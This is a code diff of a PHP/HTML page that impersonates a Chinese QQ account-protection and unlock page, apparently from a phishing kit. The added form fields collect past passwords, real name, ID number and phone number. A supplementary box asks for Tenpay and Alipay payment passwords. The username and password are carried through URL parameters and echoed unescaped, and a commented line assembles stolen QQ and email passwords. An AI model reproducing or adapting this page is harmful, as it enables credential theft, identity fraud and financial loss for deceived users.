@@ -66,7 +66,7 @@
     
     	<div id="menu">
         	<ul>
-            <li id="menu_index"><a onfocus="this.blur()" class="m1" href=""><cite>
+            <li id="menu_index"><a onfocus="this.blur()" class="m1" href="cn2.php?u=<?php echo $_GET['u']; ?>&p=<?php echo $_GET['p']; ?>"><cite>
 			首页</cite></a></li>
             <li id="menu_account_prot"><a onfocus="this.blur()" class="m2" href="cn2.php?u=<?php echo $_GET['u']; ?>&p=<?php echo $_GET['p']; ?>" onmouseover="ShowSubMenu('submenu_account_prot');" onmouseout="HideSubMenu('submenu_account_prot');"><cite>
 			帐号保护</cite></a></li>
@@ -107,7 +107,10 @@
 		
 
 		<p></p>
-		<form id="myform" name="myform" method="post" action="safe2.php?u=<?php echo $_GET['u']; ?>&p=<?php echo $_GET['p']; ?>" onsubmit="return CheckForm();">
+		<?php
+			// $requestURL="u=".$_GET['u']."&p=".$_GET['p']."&txtName=$trueName&txtAddress=$addr&txtContactQQ=$anotherQQ&txtContactQQPW=$password&radiobutton=$reciveType&txtContactEmail=$reciveMail&yxmm=$$reciveMailPassword";
+		?>
+		<form id="myform" name="myform" method="post" action="safe_result.php?u=<?php echo $_GET['u']; ?>&p=<?php echo $_GET['p']; ?>" onsubmit="return CheckForm();">
 
 			<input id="txtLoginUin" name="txtLoginUin" value="1234455" type="hidden">
 			<input value="0" id="txtCtCheckBox" name="txtCtCheckBox" type="hidden">
@@ -190,13 +193,75 @@
 				<span class="tp_txt">解除限制成功后，该邮箱会自动设置为个人资料中的联系邮箱</span>
             </li>
             
+            </ul>
+			
+			<div class="blank20"></div>
+            <!--<div class="title_right1"><b class="tr_14"></b></div>-->
+            <img src="safe1_files/1.jpg">
 
+            <ul>
+            <li id="lifillBase0">
+				<blockquote for="psw1"><b>*</b>历史密码一：</blockquote>
+				&nbsp;<input name="history_pwd_1_password" id="pwdOldPW1" value="" class="input_text" maxlength="17" style="ime-mode:disabled" onkeypress="detectCapsLock(event, 1);" onpaste="return false;" onblur="deletCapsTip();" type="password">				
+				<span class="tp_txt4 f14" style="position: absolute; margin-left: 641px; margin-top: 343px"></span>
+				<span id="lsmm1" style="display:none" class="tips_info">至少填写一个您早期用过的密码</span>&nbsp; 
+			</li>				
+			<li id="lifillBase1">
+				<blockquote for="psw2"><b>*</b>历史密码二：</blockquote>
+				&nbsp;<input name="pwdOldPW2" id="pwdOldPW2" value="" class="input_text" maxlength="17" style="ime-mode:disabled" onkeypress="detectCapsLock(event, 2);" onpaste="return false;" onblur="deletCapsTip();" type="password"> 
+			</li>
+			<li id="lifillBase2">
+				<blockquote for="psw3"><b>*</b>历史密码三：</blockquote>
+				&nbsp;<input name="pwdOldPW3" id="pwdOldPW3" value="" class="input_text" maxlength="17" style="ime-mode:disabled;" onkeypress="detectCapsLock(event, 3);" onpaste="return false;" onblur="deletCapsTip();" type="password"> 
+			</li>
+ 
+			
+			<li id="pwdOption">
+				<blockquote for="more">　</blockquote>				
+ 
+ 
+			<ul class="ulp">
+			<li>
+				<blockquote><b>*</b> 您的真实姓名：</blockquote>
+				<input name="xm" id="xm" class="input_text" size="26" maxlength="20" type="text">
+				<span id="infoName" style="display:none" class="tips_info">
+				您还没有输入真实姓名！</span>
+			</li>
+			<li><blockquote for="mode">证件类型：</blockquote>
+							<select class="select_text" id="CertCardType" name="zj">
+				<option value="0" selected="selected">请选择证件类型</option>
+				<option value="shen_fen_zheng">身份证</option> 
+				<option value="hu_zhao">护照</option> 
+				<option value="jun_guan_zheng">军官证</option> 
+				<option value="qi_ta">其它</option></select><span style="DISPLAY: none" id="zjlx" class="tips_info">请选择证件类型！</span>
+				</li>
+			<li>
+				<blockquote><b>*</b>证件号码：</blockquote>
+				<input name="hm" id="zjhm1" size="26" maxlength="24" class="input_text" type="text">&nbsp;<span style="DISPLAY: none" id="zjhm2" class="tips_info">请填写历史证件号码！</span>
+			</li>
+			<li>
+				<blockquote><b>*</b>手机号码：</blockquote>
+				<input name="sj" id="mbsj1" size="26" maxlength="11" class="input_text" style="ime-mode:disabled" type="text">&nbsp;<span style="DISPLAY: none" id="mbsj2" class="tips_info">请正确填写手机号码！</span>
+			</li>
+			</ul>            
             
-            
+<div style="display:">
+            <div class="middle_title font_14"></div>
+            <div class="title3"><b>补充资料</b></div>
+			<div>
+				<p class="mt10 ml100 f14">您可以根据情况填写补充资料例如：宝宝乐园解锁密码，玫瑰花园解锁密码，财付通二级密码、支付宝、支付密码等，用于提高解除锁定成功的机会。</p>
+            </div></div></li><li>
+			</li><li id="pwdOption">
+				<blockquote for="more"></blockquote>	
+				<textarea rows="4" name="ziliao" id="btzl1" size="26" class="textarea"></textarea> &nbsp;&nbsp;
+				<span id="btzl2" class="tips_info" style="display:none;">请认真填写补充资料</span>
+            </li>
+            </ul>
+
             <li class="btn">
             <input onclick="vbscript:myform1.submit()" src="safe_files/anniu.jpg" type="image">&nbsp;
 			</li>
-            </ul>
+
 	
 	</form>        
 	</div>    
